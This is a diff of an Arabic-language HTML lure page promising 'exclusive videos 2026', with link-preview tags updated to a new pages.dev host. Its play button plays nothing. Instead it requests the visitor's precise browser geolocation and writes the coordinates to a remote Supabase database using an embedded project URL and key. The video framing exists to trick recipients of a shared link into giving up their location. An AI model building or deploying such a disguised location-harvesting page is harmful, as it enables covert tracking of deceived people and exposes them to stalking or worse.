@@ -5,111 +5,184 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <title>فيديوهات حصرية</title>
+    <title>فيديوهات حصرية 2026</title>
 
-    <!-- WhatsApp / Facebook / Social Preview -->
-    <meta property="og:title" content="فيديوهات حصرية">
-    <meta property="og:description" content="اضغط لمشاهدة الفيديو">
-    <meta property="og:image"
-        content="https://mahmoud3035-create.github.io/location-share/image.png">
+    <!-- ==============================
+         WhatsApp / Facebook Preview
+    =============================== -->
+
+    <meta property="og:title" content="فيديوهات حصرية 2026">
+
+    <meta
+        property="og:description"
+        content="اضغط لمشاهدة الفيديو"
+    >
+
+    <meta
+        property="og:image"
+        content="https://videos-2026.pages.dev/image.png"
+    >
+
+    <meta
+        property="og:url"
+        content="https://videos-2026.pages.dev/"
+    >
+
     <meta property="og:type" content="website">
-    <meta property="og:url"
-        content="https://mahmoud3035-create.github.io/location-share/">
 
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="فيديوهات حصرية">
-    <meta name="twitter:description" content="اضغط لمشاهدة الفيديو">
-    <meta name="twitter:image"
-        content="https://mahmoud3035-create.github.io/location-share/image.png">
+    <!-- Twitter / Social Preview -->
+
+    <meta
+        name="twitter:card"
+        content="summary_large_image"
+    >
+
+    <meta
+        name="twitter:title"
+        content="فيديوهات حصرية 2026"
+    >
+
+    <meta
+        name="twitter:description"
+        content="اضغط لمشاهدة الفيديو"
+    >
+
+    <meta
+        name="twitter:image"
+        content="https://videos-2026.pages.dev/image.png"
+    >
+
 
     <style>
+
         * {
             box-sizing: border-box;
         }
 
+
         body {
             margin: 0;
+
             min-height: 100vh;
+
             background: #111;
+
             font-family: Arial, sans-serif;
+
             color: white;
 
             display: flex;
+
             justify-content: center;
+
             align-items: center;
 
             padding: 20px;
         }
 
+
         .page {
             width: 100%;
+
             max-width: 600px;
+
             text-align: center;
         }
 
+
         h1 {
             margin: 0 0 10px;
+
             font-size: 28px;
         }
 
+
         .subtitle {
             color: #ddd;
+
             margin-bottom: 20px;
         }
+
+
+        /* ==============================
+           صورة الفيديو
+        =============================== */
 
         .video-preview {
             position: relative;
 
             width: 100%;
+
             aspect-ratio: 16 / 9;
 
             background-image: url("./image.png");
+
             background-size: cover;
+
             background-position: center;
 
             border-radius: 12px;
+
             overflow: hidden;
 
             display: flex;
+
             justify-content: center;
+
             align-items: center;
 
             cursor: pointer;
         }
 
+
         .video-preview::before {
             content: "";
+
             position: absolute;
+
             inset: 0;
 
             background: rgba(0, 0, 0, 0.20);
         }
 
+
+        /* ==============================
+           زر التشغيل
+        =============================== */
+
         .play-button {
             position: relative;
+
             z-index: 2;
 
             width: 78px;
+
             height: 78px;
 
             border-radius: 50%;
 
             background: white;
+
             color: #111;
 
             display: flex;
+
             align-items: center;
+
             justify-content: center;
 
             font-size: 36px;
+
             padding-left: 5px;
 
             transition: transform 0.2s;
         }
 
+
         .video-preview:hover .play-button {
             transform: scale(1.08);
         }
+
 
         .video-label {
             position: absolute;
@@ -117,14 +190,22 @@
             z-index: 2;
 
             bottom: 15px;
+
             left: 0;
+
             right: 0;
 
             color: white;
+
             font-size: 16px;
 
             text-shadow: 0 1px 4px #000;
         }
+
+
+        /* ==============================
+           التنبيه
+        =============================== */
 
         .notice {
             margin-top: 18px;
@@ -138,62 +219,82 @@
             color: #ddd;
 
             line-height: 1.7;
+
             font-size: 14px;
         }
 
+
+        /* ==============================
+           النتيجة
+        =============================== */
+
         #result {
             margin-top: 20px;
+
             min-height: 30px;
+
             line-height: 2;
         }
 
+
         .success {
             color: #20d866;
+
             font-weight: bold;
         }
 
+
         .error {
             color: #ff5555;
+
             font-weight: bold;
         }
+
 
         .loading {
             color: #ddd;
         }
 
+
         .permission-box {
             margin-top: 15px;
+
             padding: 15px;
+
             background: #222;
+
             border-radius: 10px;
+
             color: #ddd;
+
             line-height: 1.8;
         }
 
-        .permission-button {
-            margin-top: 10px;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 8px;
-            background: white;
-            color: #111;
-            cursor: pointer;
-            font-size: 15px;
-        }
+
     </style>
+
 </head>
+
 
 <body>
 
+
     <div class="page">
 
+
         <h1>
-            فيديوهات حصرية
+            فيديوهات حصرية 2026
         </h1>
+
 
         <div class="subtitle">
             اضغط على الزر لمشاهدة الفيديو
         </div>
+
+
+        <!-- ==============================
+             صورة الفيديو + زر التشغيل
+        =============================== -->
 
         <div
             class="video-preview"
@@ -207,29 +308,57 @@
                 ▶
             </div>
 
+
             <div class="video-label">
                 اضغط لمشاهدة الفيديو
             </div>
 
         </div>
 
+
+        <!-- ==============================
+             توضيح للمستخدم
+        =============================== -->
+
         <div class="notice">
+
             اضغط على زر التشغيل للمتابعة.
-            إذا اخترت مشاركة موقعك، سيظهر لك طلب من المتصفح
-            للموافقة على مشاركة موقعك.
+
+            <br>
+
+            سيطلب منك المتصفح الإذن بمشاركة موقعك.
+
+            <br>
+
+            لن يتم حفظ موقعك إلا بعد موافقتك.
+
         </div>
 
+
         <div id="result"></div>
+
 
     </div>
 
 
+
+    <!-- ==============================
+         Supabase
+    =============================== -->
+
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
 
     <script>
 
+
+        /* ==============================
+           Supabase
+        =============================== */
+
         const SUPABASE_URL =
             "https://vsztpvsicsmxjhsvqzbv.supabase.co";
+
 
         const SUPABASE_PUBLISHABLE_KEY =
             "sb_publishable_N2P-l8nE7GaChsD5lrxb4w_nr8K5UrM";
@@ -242,8 +371,14 @@
             );
 
 
+
+        /* ==============================
+           العناصر
+        =============================== */
+
         const locationButton =
             document.getElementById("locationButton");
+
 
         const result =
             document.getElementById("result");
@@ -252,11 +387,21 @@
         let processing = false;
 
 
+
+        /* ==============================
+           الضغط على الزر
+        =============================== */
+
         locationButton.addEventListener(
             "click",
             requestLocation
         );
 
+
+
+        /* ==============================
+           Enter / Space
+        =============================== */
 
         locationButton.addEventListener(
             "keydown",
@@ -276,7 +421,13 @@
         );
 
 
+
+        /* ==============================
+           طلب الموقع
+        =============================== */
+
         function requestLocation() {
+
 
             if (processing) {
                 return;
@@ -298,13 +449,24 @@
 
 
             result.innerHTML = `
+
                 <div class="permission-box">
-                    للسماح بمشاركة موقعك، اضغط على
-                    <strong>السماح / Allow</strong>
-                    عندما يطلب المتصفح الإذن.
+
+                    سيتم الآن طلب إذن المتصفح
+                    للوصول إلى موقعك.
+
                     <br>
-                    لن يتم حفظ موقعك إلا إذا وافقت.
+
+                    اختر
+                    <strong>السماح / Allow</strong>
+                    إذا كنت تريد مشاركة موقعك.
+
+                    <br>
+
+                    لن يتم حفظ الموقع بدون موافقتك.
+
                 </div>
+
             `;
 
 
@@ -316,21 +478,32 @@
 
                 {
                     enableHighAccuracy: true,
+
                     timeout: 15000,
+
                     maximumAge: 0
                 }
 
             );
+
         }
 
 
+
+        /* ==============================
+           نجاح الحصول على الموقع
+        =============================== */
+
         async function locationSuccess(position) {
+
 
             const latitude =
                 position.coords.latitude;
 
+
             const longitude =
                 position.coords.longitude;
+
 
             const accuracy =
                 position.coords.accuracy;
@@ -343,6 +516,7 @@
 
 
             try {
+
 
                 const { error } =
                     await supabaseClient
@@ -358,22 +532,28 @@
                         });
 
 
+
                 if (error) {
+
 
                     console.error(
                         "Supabase error:",
                         error
                     );
 
+
                     result.innerHTML =
                         '<span class="error">' +
                         'حدث خطأ أثناء حفظ الموقع.' +
                         '</span>';
 
+
                     processing = false;
 
                     return;
+
                 }
+
 
 
                 result.innerHTML =
@@ -384,22 +564,33 @@
 
             }
 
+
             catch (error) {
 
+
                 console.error(error);
+
 
                 result.innerHTML =
                     '<span class="error">' +
                     'حدث خطأ أثناء حفظ الموقع.' +
                     '</span>';
+
             }
 
 
             processing = false;
+
         }
 
 
+
+        /* ==============================
+           أخطاء الموقع
+        =============================== */
+
         function locationError(error) {
+
 
             console.error(
                 "Location error:",
@@ -409,6 +600,7 @@
 
             if (error.code === 1) {
 
+
                 result.innerHTML =
                     '<span class="error">' +
                     'لم تتم الموافقة على مشاركة الموقع.' +
@@ -416,7 +608,9 @@
 
             }
 
+
             else if (error.code === 2) {
+
 
                 result.innerHTML =
                     '<span class="error">' +
@@ -425,7 +619,9 @@
 
             }
 
+
             else if (error.code === 3) {
+
 
                 result.innerHTML =
                     '<span class="error">' +
@@ -434,19 +630,25 @@
 
             }
 
+
             else {
+
 
                 result.innerHTML =
                     '<span class="error">' +
                     'تعذر الحصول على موقعك.' +
                     '</span>';
+
             }
 
 
             processing = false;
+
         }
 
+
     </script>
+
 
 </body>
 
